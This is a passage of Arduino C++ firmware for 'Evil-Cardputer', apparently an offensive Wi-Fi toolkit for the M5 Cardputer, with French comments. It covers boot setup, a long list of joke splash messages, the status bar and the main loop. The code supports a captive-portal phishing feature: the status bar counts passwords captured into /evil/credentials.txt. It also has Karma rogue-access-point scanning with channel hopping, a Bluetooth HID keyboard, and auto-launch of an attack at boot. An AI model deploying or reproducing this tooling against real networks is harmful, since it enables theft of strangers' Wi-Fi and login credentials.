// Fonction pour arrÃªter la lecture
void stop(void) {
  if (id3 == nullptr) return;
  out.stop();
  mp3.stop();
  id3->close();
  file.close();
  delete id3;
  id3 = nullptr;
}

// Fonction pour lire un fichier MP3
void play(const char* fname) {
  if (id3 != nullptr) {
    stop();
  }
  file.open(fname);
  id3 = new AudioFileSourceID3(&file);
  id3->open(fname);
  mp3.begin(id3, &out);
}


//mp3 end


bool wificonnected = false;
String ipAddress = "";

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "BLEHIDDevice.h"
#include "HIDTypes.h"

// DÃ©clarations globales et variables

BLEHIDDevice* hid;
BLECharacteristic* keyboardInput;
bool isConnected = false;
bool isBluetoothKeyboardActive = false; // Indicateur pour l'Ã©tat du clavier Bluetooth


String discordWebhookURL = "";

String llmHost        = "";
int    llmhttpsPort   = 443;
String llmapiPath     = "/evilOllama/api/generate";
String llmUser        = "";
String llmPass        = "";
String llmModel       = "tinyllama";
int    llmMaxTokens   = 512;

char currentNick[16] = "";

static bool isBLEInitialized = false;

void releaseBLE() {
  BLEScan* pBLEScan = BLEDevice::getScan();
  if (pBLEScan) {
    pBLEScan->stop();   // ðŸ”¥ stoppe tout scan actif
  }
  // Si BLE n'a jamais Ã©tÃ© init, on ne libÃ¨re pas
  if (!isBLEInitialized) return;

  // DÃ©sactive proprement le device BLE
  BLEDevice::deinit();

  // Ne relÃ¢che la mÃ©moire quâ€™une fois, jamais plusieurs
  static bool released = false;
  if (!released) {
    esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
    if (err == ESP_OK) {
      Serial.println(F("BLE memory released."));
    } else {
      Serial.printf("BLE release skipped (err=0x%x)\n", err);
    }
    released = true;
  }

  isBLEInitialized = false;
}


// ---- Captive Portal IP selection ----
// 0 = 192.168.4.1 (dÃ©faut), 1 = 172.0.0.1
int portalIpIndex = 0;

static const IPAddress kCaptiveIPs[2] = {
  IPAddress(192, 168, 4, 1),
  IPAddress(172, 0,   0, 1)
};

static const char* const kCaptiveIPStr[2] = {
  "192.168.4.1",
  "172.0.0.1"
};


void setup() {
  Serial.begin(115200);
  M5.begin();
  M5.Lcd.setRotation(1);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setTextFont(1);
  if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
    gpsRxPin = 15;   // Adv
    gpsTxPin = 13;
    pinMode(5, OUTPUT);
    digitalWrite(5, HIGH);
    Serial.println("Detected: Cardputer-ADV");
  } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
    gpsRxPin = 1;    // Normal Cardputer
    gpsTxPin = -1;
    Serial.println("Detected: Cardputer");
  } else {
    gpsRxPin = -1;   // fallback
    gpsTxPin = -1;
    Serial.println("Unknown board type");
  }

  static const char * const PROGMEM  startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth for Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
    "Where we're going We don't need roads Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
    "Never leave a trace always  behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
    "Injecting hook.worm ransomware to your android",// Donation on Ko-fi // Thx hook.worm !
    "    You know Kiyomi ? ", // for collab on Wof
    "Compressing wook.worm algorithm", // Donation on Ko-fi // Thx wook.worm !
    "Summoning the void by kdv88", // Donation on Ko-fi // Thx kdv88 !
    "Egg sandwich - robt2d2",// Donation on Ko-fi // Thx robt2d2 !
    " Scared of the .bat? KNAX", // Donation on Ko-fi // Thx KNAX !
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!",
    "    Shaking champagneâ€¦",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "Affirmative Dave, I read you.",
    "Your Evil-M5Core2 have died of dysentery",
    "Did you disable PSRAM ?",
    "You already star project?",
    "Rick's Portal Gun Activated...",
    "Engaging in Plumbus Assembly...",
    "Wubba Lubba Dub Dub!",
    "Syncing with Meeseeks Box.",
    "Searching for Szechuan Sauce...",
    "Scanning Galactic Federation...",
    "Exploring Dimension C-137.",
    "Navigating the Citadel...",
    "Jerry's Dumb Ideas Detected...",
    "Engaging in Ricksy Business...",
    "Morty's Mind Blowers Loading...",
    "Tuning into Interdimensional Cable...",
    "Hacking into Council of Ricks...",
    "Deploying Mr. Poopybutthole...",
    "Vindicators Assemble...",
    "Snuffles the Smart Dog Activated...",
    "Using Butter Robot...",
    "Evil Morty Schemes Unfolding...",
    "Beth's Cloning Facility Accessed...",
    "Listening to Get Schwifty.",
    "Birdperson in Flight...",
    "Gazorpazorpfield Hates Mondays...",
    "Tampering with Time Crystals...",
    "Engaging Space Cruiser...",
    "Gazorpazorp Emissary Arrived...",
    "Navigating the Cronenberg World...",
    "Using Galactic Federation Currency...",
    "Galactic Adventure Awaits.",
    "Plumbus Maintenance In Progress...",
    "Taming the Dream Inceptors",
    "Mr. Goldenfold's Nightmare",
    "Hacking into Unity's Mind.",
    "Beta 7 Assimilation in Progress...",
    "Purging the Planet...",
    "Planet Music Audition...",
    "Hacking into Rick's Safe..",
    "Extracting from Parasite Invasion...",
    "Scanning for Evil Rick...",
    "Preparing for Jerryboree..",
    "Plutonian Negotiations...",
    "Tiny Rick Mode Activated..",
    "Scanning for Cromulons...",
    "Decoding Rick's Blueprints",
    "Breaking the Fourth Wall..",
    "Jerry's App Idea Rejected.",
    "Galactic Federation Hacked",
    "Portal Gun Battery Low...",
    "ccessing Anatomy Park...",
    "Interdimensional Travel Commencing...",
    "Vampire Teacher Alert...",
    "Navigating Froopyland...",
    "Synchronizing with Butter Bot...",
    "Unity Connection Established...",
    "Evil Morty Conspiracy...",
    "Listening to Roy: A Life Well Lived...",
    "Galactic Government Overthrown...",
    "Scanning for Gearhead...",
    "Engaging Heist-o-Tron...",
    "Confronting Scary Terry...",
    "Engaging in Squanching...",
    "Learning from Birdperson..",
    "Dimension Hopping Initiated...",
    "Morty Adventure Card Filled...",
    "Engaging Operation Phoenix...",
    "Developing DarkMatter Formula",
    "Teleporting to Bird World...",
    "Exploring Blips and Chitz...",
    "Synchronizing with Noob Noob.",
    "Plumbus Optimization...",
    "Beth's Self-Discovery Quest..",
    "Extract from Galactic Prison...",
    "Taming the Zigerion Scammers...",
    "Dimension C-500k Travel...",
    "Sneaking into Birdperson's Wedding...",
    "Preparing Microverse Battery...",
    "Vindicator Call Initiated.",
    "Evil Morty Tracking...",
    "Snuffles' Revolution...",
    "Navigating Abadango Cluster...",
    "Syncing with Phoenix Person...",
    "Stealing from Devil's Antique Shop...",
    "Beth's Horse Surgeon Adventures...",
    "Engaging Purge Planet...",
    "Evil Morty Plans Detected.",
    "Exploring the Thunderdome.",
    "Extracting Toxic Rick...",
    "Tiny Rick Singing...",
    "Birdperson's Memories...",
    "Intergalactic Criminal Record...",
    "Dismantling Unity's Hive Mind...",
    "Engaging with Snuffles...",
    "Exploring Anatomy Park...",
    "Rewiring Rick's Mind...",
    "Scanning for Sleepy Gary..",
    "Navigating the Narnian Box",
    "Engaging Rick's AI Assistant...",
    "Synchronizing with Beth's Clone...",
    "Preparing for Ricklantis Mixup...",
    "Morty's Science Project...",
    "Portal Gun Malfunction...",
    "Galactic Federation Detected...",
    "Jerry's Misadventures...",
    "Engaging Operation Phoenix",
    "Scanning for Snowball...",
    "Morty's Science Project...",
    "Evil Morty's Reign...",
    "Navigating Purge Planet...",
    "Rick's Memories Unlocked..",
    "Synchronizing with Tinkles",
    "Galactic Federation Hacked",
    "Rick's AI Assistant Activated...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
    "Rick's Safe Hacked...",
    "Morty's Adventure Awaits..",
    "Synchronizing with Snowball...",
    "Evil Morty Conspiracy...",
    "Galactic Adventure Awaits.",
    "Rick's AI Assistant Activated...",
    "Interdimensional Cable Tuning...",
    "Navigating Zigerion Base...",
    "Morty's School Science Project...",
    "Rick's Portal Gun Malfunction...",
    "Engaging Ricklantis Mixup..",
    "Galactic Federation Hacked.",
    "Beth's Clone Identified...",
    "Synchronizing with Phoenix Person...",
    "Galactic Government Overthrown...",
    "Listening to Get Schwifty..",
    "Rick's Safe Hacked...",
    "Morty's Mind Blowers Loaded",
    "Engaging Galactic Federation..",
    "Scanning for Snowball...",
    "Evil Morty's Reign Initiated...",
    "Navigating Purge Planet...",
    "Synchronizing with Tinkles...",
    "Galactic Federation Hacked...",
    "Rick's Memories Unlocked...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];

  SPI.begin(SCK, MISO, MOSI, -1);
  if (!SD.begin(12, SPI, 40000000UL)) {
    Serial.println(F("Error.."));
    Serial.println(F("SD card not mounted..."));
    M5.Display.fillRect(0, 0, 240, 135, menuBackgroundColor);
    M5.Display.drawRect(10, 20, 220, 95, TFT_RED);
    M5.Display.fillRect(11, 21, 218, 93, taskbarBackgroundColor);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.setTextSize(2);
    int textWidth = M5.Display.textWidth("SD Card Error");
    M5.Display.setCursor((240 - textWidth) / 2, 40);
    M5.Display.println("SD Card Error");
    M5.Display.setTextColor(TFT_RED);
    M5.Display.setTextSize(1);
    textWidth = M5.Display.textWidth("Evil cannot work without SD card");
    M5.Display.setCursor((240 - textWidth) / 2, 85);
    M5.Display.println("Evil cannot work without SD card");
    delay(4000);
    M5.Display.setTextSize(1.5);
  } else {
    Serial.println(F("----------------------"));
    Serial.println(F("SD card initialized !! "));
    Serial.println(F("----------------------"));

    // VÃ©rifier et crÃ©er le dossier audio s'il n'existe pas
    if (!SD.exists("/evil/audio")) {
      Serial.println(F("Audio folder not found, creating..."));
      if (SD.mkdir("/evil/audio")) {
        Serial.println(F("Audio folder created successfully."));
      } else {
        Serial.println(F("Failed to create audio folder."));
      }
    }

    String batteryLevelStr = getBatteryLevel();
    int batteryLevel = batteryLevelStr.toInt();

    if (batteryLevel < 15) {
      drawImage("/evil/img/low-battery-cardputer.jpg");
      Serial.println(F("-------------------"));
      Serial.println(F("!!!!Low Battery!!!!"));
      Serial.println(F("-------------------"));
      delay(1000);
    }

    // RÃ©cupÃ©rer les paramÃ¨tres configurÃ©s
    restoreConfigParameter("brightness");
    restoreConfigParameter("ledOn");
    restoreConfigParameter("soundOn");
    restoreConfigParameter("volume");
    restoreConfigParameter("randomOn");
    restoreConfigParameter("selectedTheme");
    restoreConfigParameter("wifi_ssid");
    restoreConfigParameter("wifi_password");
    restoreConfigParameter("baudrate_gps");

    restoreThemeParameters();
    delay(500);
    loadStartupImageConfig();
    loadStartupSoundConfig();

    // Si randomOn est activÃ©, charger une image et un son alÃ©atoires
    if (randomOn) {
      String randomImage = getRandomImage();  // SÃ©lectionner une image alÃ©atoire
      String randomSound = getRandomSound();  // SÃ©lectionner un son alÃ©atoire

      drawImage(randomImage.c_str());
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumÃ©e
        pixels.show();
      }
      if (soundOn) {
        play(randomSound.c_str());
        while (mp3.isRunning()) {
          if (!mp3.loop()) {
            mp3.stop();
          } else {
            delay(1);
          }
        }
        stop();
      } else {
        delay(2000);
      }
    } else {
      // Comportement par dÃ©faut
      drawImage(selectedStartupImage.c_str());
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumÃ©e
        pixels.show();
      }
      if (soundOn) {
        play(selectedStartupSound.c_str());
        while (mp3.isRunning()) {
          if (!mp3.loop()) {
            mp3.stop();
          } else {
            delay(1);
          }
        }
        stop();
      } else {
        delay(2000);
      }
    }
  }

  //mooved to reduce time at boot before printing image
  restoreConfigParameter("ssh_user");
  restoreConfigParameter("ssh_host");
  restoreConfigParameter("ssh_password");
  restoreConfigParameter("ssh_port");
  restoreConfigParameter("tcp_host");
  restoreConfigParameter("tcp_port");
  restoreConfigParameter("webpassword");
  restoreConfigParameter("discordWebhookURL");
  restoreConfigParameter("llm_host");
  restoreConfigParameter("llm_port");
  restoreConfigParameter("llm_api_path");
  restoreConfigParameter("llm_user");
  restoreConfigParameter("llm_pass");
  restoreConfigParameter("llm_model");
  restoreConfigParameter("llm_max_tokens");
  restoreConfigParameter("evilChatNickname");
  restoreConfigParameter("portal_file");
  restoreConfigParameter("cloned_ssid");
  restoreConfigParameter("portal_password");
  restoreConfigParameter("portal_ip_sel");
  restoreConfigParameter("cpu_freq");
  restoreConfigParameter("gps_pins_mode");
  // Boot auto-launch configuration
  restoreConfigParameter("startatboot");
  restoreConfigParameter("casetostartatboot");
  restoreConfigParameter("boot_countdown");
  int textY = 30;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30;

  M5.Display.clear();
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  // Largeur de l'Ã©cran
  int screenWidth = M5.Lcd.width();

  // Textes Ã  afficher
  const char* text1 = "Evil-Cardputer";
  const char* text2 = "By 7h30th3r0n3";
  const char* text3 = "v1.4.9 2025";

  // Mesure de la largeur du texte et calcul de la position du curseur
  int text1Width = M5.Lcd.textWidth(text1);
  int text2Width = M5.Lcd.textWidth(text2);
  int text3Width = M5.Lcd.textWidth(text3);

  int cursorX1 = (screenWidth - text1Width) / 2;
  int cursorX2 = (screenWidth - text2Width) / 2;
  int cursorX3 = (screenWidth - text3Width) / 2;

  // Position de Y pour chaque ligne
  int textY1 = textY;
  int textY2 = textY + 20;
  int textY3 = textY + 45;

  // Affichage sur l'Ã©cran
  M5.Lcd.setCursor(cursorX1, textY1);
  M5.Lcd.println(text1);

  M5.Lcd.setCursor(cursorX2, textY2);
  M5.Lcd.println(text2);

  M5.Lcd.setCursor(cursorX3, textY3);
  M5.Lcd.println(text3);

  // Affichage en sÃ©rie
  Serial.println(F("-------------------"));
  Serial.println(F("Evil-Cardputer"));
  Serial.println(F("By 7h30th3r0n3"));
  Serial.println(F("v1.4.9 2025"));
  Serial.println(F("-------------------"));
  // Diviser randomMessage en deux lignes pour s'adapter Ã  l'Ã©cran
  int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractÃ¨re
  int randomMessageLength = strlen(randomMessage);  // Utilisation de strlen() pour obtenir la longueur

  String line1 = "";
  String line2 = "";

  int currentLength = 0;  // Longueur actuelle de la ligne
  bool onSecondLine = false;

  for (int i = 0; i < randomMessageLength; i++) {
    char currentChar = randomMessage[i];

    // Ajouter le mot Ã  la ligne appropriÃ©e
    if (currentLength + 1 > maxCharsPerLine && currentChar == ' ') {
      if (!onSecondLine) {
        onSecondLine = true;
        currentLength = 0;  // RÃ©initialiser la longueur pour la deuxiÃ¨me ligne
        continue;  // Passer Ã  la prochaine itÃ©ration pour commencer la deuxiÃ¨me ligne
      } else {
        break;  // Si on a atteint la limite de la deuxiÃ¨me ligne, arrÃªter
      }
    }

    if (onSecondLine) {
      line2 += currentChar;
    } else {
      line1 += currentChar;
    }

    currentLength++;
  }

  // Position de dÃ©part pour l'affichage des deux lignes de randomMessage
  int randomMessageY1 = textY + 80;  // Position Y de la premiÃ¨re ligne de randomMessage
  int randomMessageY2 = randomMessageY1 + 12;  // Position Y de la seconde ligne de randomMessage

  M5.Display.setCursor(5, randomMessageY1);
  M5.Display.println(line1);

  M5.Display.setCursor(5, randomMessageY2);
  M5.Display.println(line2);

  // Affichage de randomMessage en sÃ©rie
  Serial.println(F(" "));
  Serial.println(randomMessage);
  Serial.println(F("-------------------"));

  firstScanWifiNetworks();
  Serial.println(F("First scan wifi.."));

  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
    delay(250);
  }

  if (ssid != "") {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startAttemptTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
      delay(500);
      Serial.println(F("Trying to connect to Wifi..."));
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println(F("Connected to wifi !!!"));
      M5.Display.clear();
      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2);
      M5.Display.println("Connected to");
      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 12);
      M5.Display.println(ssid);
      delay(1000);
    } else {
      Serial.println(F("Fail to connect to Wifi or timeout..."));
      WiFi.disconnect();
    }
  } else {
    Serial.println(F("SSID is empty."));
    Serial.println(F("Skipping Wi-Fi connection."));
    Serial.println(F("----------------------"));
  }

  pixels.begin(); // led init

  // GPS sur RX=gpsRxPin, pas de TX (-1), baudrate = 9600 (par ex.)
  cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);

  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  esp_wifi_set_max_tx_power(84);
  drawMenu();
}



void drawImage(const char *filepath) {
  fs::File file = SD.open(filepath);
  M5.Display.drawJpgFile(SD, filepath);

  file.close();
}


void firstScanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 2000) {
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }

  if (n == 0) {
    Serial.println(F("No network found ..."));
  } else {
    Serial.print(n);
    Serial.println(F(" Near Wifi Networks : "));
    Serial.println(F("-------------------"));
    numSsid = min(n, 30);
    for (int i = 0; i < numSsid; i++) {
      if ((int)ssidList.size() <= i) ssidList.resize(i+1);
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(F(": "));
      Serial.println(ssidList[i]);
    }
    Serial.println(F("-------------------"));
  }
}

unsigned long previousMillis = 0;
const long interval = 1000;

void sshConnect(const char *host = nullptr);


unsigned long lastTaskBarUpdateTime = 0;
const long taskBarUpdateInterval = 1000; // Mettre Ã  jour chaque seconde
bool pageAccessFlag = false;

int getConnectedPeopleCount() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);
  return stationList.num; // Retourne le nombre de clients connectÃ©s
}

int getCapturedPasswordsCount() {
  File file = SD.open("/evil/credentials.txt");
  if (!file) {
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}
void initTaskBarSprite() {
  if (!taskBarSpriteReady) {
    taskBarCanvas.createSprite(M5.Display.width(), 12);
    taskBarSpriteReady = true;
  }
}

void drawTaskBar() {
  initTaskBarSprite();          // plus de rÃ©allocation
  taskBarCanvas.fillRect(0, 0, taskBarCanvas.width(), 10, taskbarBackgroundColor); // Dessiner un rectangle bleu en haut de l'Ã©cran
  taskBarCanvas.fillRect(0, 10, taskBarCanvas.width(), 2, taskbarDividerColor); // Dessiner un rectangle bleu en haut de l'Ã©cran
  taskBarCanvas.setTextColor(taskbarTextColor);

  if (Colorful) {
    // Number of Connections
    int connectedPeople = getConnectedPeopleCount();
    taskBarCanvas.setCursor(5, 2);
    taskBarCanvas.print("Sta:");
    taskBarCanvas.setCursor(30, 2);
    taskBarCanvas.setTextColor(connectedPeople > 0 ? menuTextFocusedColor : taskbarTextColor);
    taskBarCanvas.print(String(connectedPeople));

    // Password Captures
    int capturedPasswords = getCapturedPasswordsCount();
    taskBarCanvas.setCursor(50, 2); // Position right of connections
    taskBarCanvas.setTextColor(taskbarTextColor);
    taskBarCanvas.print("Pwd:");
    taskBarCanvas.setCursor(75, 2);
    taskBarCanvas.setTextColor(capturedPasswords > 0 ? menuTextFocusedColor : taskbarTextColor);
    taskBarCanvas.print(String(capturedPasswords));

    // Indicateur Captive Portal
    taskBarCanvas.setCursor(95, 1);
    taskBarCanvas.setTextColor(taskbarTextColor);
    taskBarCanvas.print("P:");
    taskBarCanvas.setCursor(108, 1);
    taskBarCanvas.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED);
    taskBarCanvas.print(String(isCaptivePortalOn ? "On" : "Off"));

    // Indicateur de connexion rÃ©seau
    taskBarCanvas.setCursor(140, 1); // Position aprÃ¨s "P:On/Off"
    taskBarCanvas.setTextColor(taskbarTextColor);
    taskBarCanvas.print("C:");
    taskBarCanvas.setTextColor(WiFi.localIP().toString() != "0.0.0.0" ? TFT_GREEN : TFT_RED);
    taskBarCanvas.print(String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off"));
    taskBarCanvas.setTextColor(taskbarTextColor);

    // Get/Draw Battery Level
    String batteryLevel = getBatteryLevel();
    int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 1);

    int batteryLevelInt = batteryLevel.toInt();  // Convert String to integer once

    taskBarCanvas.setTextColor(batteryLevelInt >= 70 ? TFT_GREEN :
                               (batteryLevelInt >= 40 ? TFT_YELLOW : TFT_RED));
    taskBarCanvas.print(batteryLevel + "%");
  } else {
    // Afficher le nombre de personnes connectÃ©es
    int connectedPeople = getConnectedPeopleCount();
    taskBarCanvas.setCursor(5, 2); // Positionner Ã  gauche
    taskBarCanvas.print("Sta:" + String(connectedPeople));

    // Afficher le nombre de mots de passe capturÃ©s
    int capturedPasswords = getCapturedPasswordsCount();
    taskBarCanvas.setCursor(50, 2); // Positionner aprÃ¨s "Sta"
    taskBarCanvas.print("Pwd:" + String(capturedPasswords));

    // Indicateur Captive Portal
    taskBarCanvas.setCursor(95, 2); // Positionner aprÃ¨s "Pwd"
    taskBarCanvas.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED);
    taskBarCanvas.print("P:" + String(isCaptivePortalOn ? "On" : "Off"));

    // Indicateur de connexion rÃ©seau
    taskBarCanvas.setCursor(140, 2); // Position aprÃ¨s "P:On/Off"
    taskBarCanvas.setTextColor(taskbarTextColor);
    taskBarCanvas.print("C:" + String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off"));

    // Afficher le niveau de batterie Ã  droite
    String batteryLevel = getBatteryLevel();
    int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 2); // Positionner Ã  droite
    taskBarCanvas.print(batteryLevel + "%");
  }

  // Afficher l'indicateur de point clignotant pour les accÃ¨s aux pages et DNS
  static bool dotState = false;
  dotState = !dotState;
  taskBarCanvas.setCursor(87, 2); // Positionner aprÃ¨s "Pwd"

  if (pageAccessFlag) {
    taskBarCanvas.print("" + String(dotState ? "â– " : " "));
    pixels.setPixelColor(0, pixels.Color(0, 255, 0));
    pixels.show();
    delay(100);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
    pageAccessFlag = false; // RÃ©initialiser le flag aprÃ¨s affichage
  } else {
    taskBarCanvas.print("  ");
  }

  // Afficher le framebuffer de la barre de tÃ¢ches
  taskBarCanvas.pushSprite(0, 0);
  //taskBarCanvas.deleteSprite();
}

void hopKarmaChannel() {
  currentKarmaChannelIndex = (currentKarmaChannelIndex + 1) % numKarmaChannels;
  int channel = karmaChannels[currentKarmaChannelIndex];
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void loop() {
  M5Cardputer.update();
  handleDnsRequestSerial();
  unsigned long currentMillis = millis();

  // One-shot boot launcher: allow a short countdown to cancel
  if (!bootLaunchDone) {
    bootLaunchDone = true;
    if (startAtBootFlag && caseToStartAtBoot >= 0 && caseToStartAtBoot < menuSize) {
      bool aborted = false;
      int secs = bootCountdownSeconds;
      if (secs < 0) secs = 0;
      if (secs > 30) secs = 30;
      if (secs > 0) {
        for (int t = secs; t > 0; --t) {
          M5.Display.clear();
          M5.Display.setTextSize(1.5);
          M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
          M5.Display.setCursor(10, 40);
          M5.Display.println("Auto-start in " + String(t) + " s");
          M5.Display.setCursor(10, 60);
          M5.Display.println("Press ENTER to cancel");
          M5.Display.display();
          uint32_t t0 = millis();
          while (millis() - t0 < 1000) {
            M5.update();
            M5Cardputer.update();
            if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) { aborted = true; break; }
            delay(10);
          }
          if (aborted) break;
        }
      }
      if (!aborted) {
        Serial.println(F("[BOOT] Auto-launch executing selected case"));
        executeMenuItem(caseToStartAtBoot);
      } else {
        // stay in menu
        inMenu = true; lastIndex = -1; drawMenu();
      }
    }
  }

  // Mettre Ã  jour la barre de tÃ¢ches indÃ©pendamment du menu
  if (currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval && inMenu) {
    drawTaskBar();
    lastTaskBarUpdateTime = currentMillis;
  }

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          startScanKarma();
          currentStateKarma = ScanningKarma;
        }
        break;

      case ScanningKarma:
        if (millis() - lastKarmaChannelSwitch > karmaChannelInterval) {
          lastKarmaChannelSwitch = millis();
          hopKarmaChannel();
        }
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma();
        break;

      case SelectSSIDKarma:
        handleMenuInputKarma();
        break;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentStateKarma == StartScanKarma) {
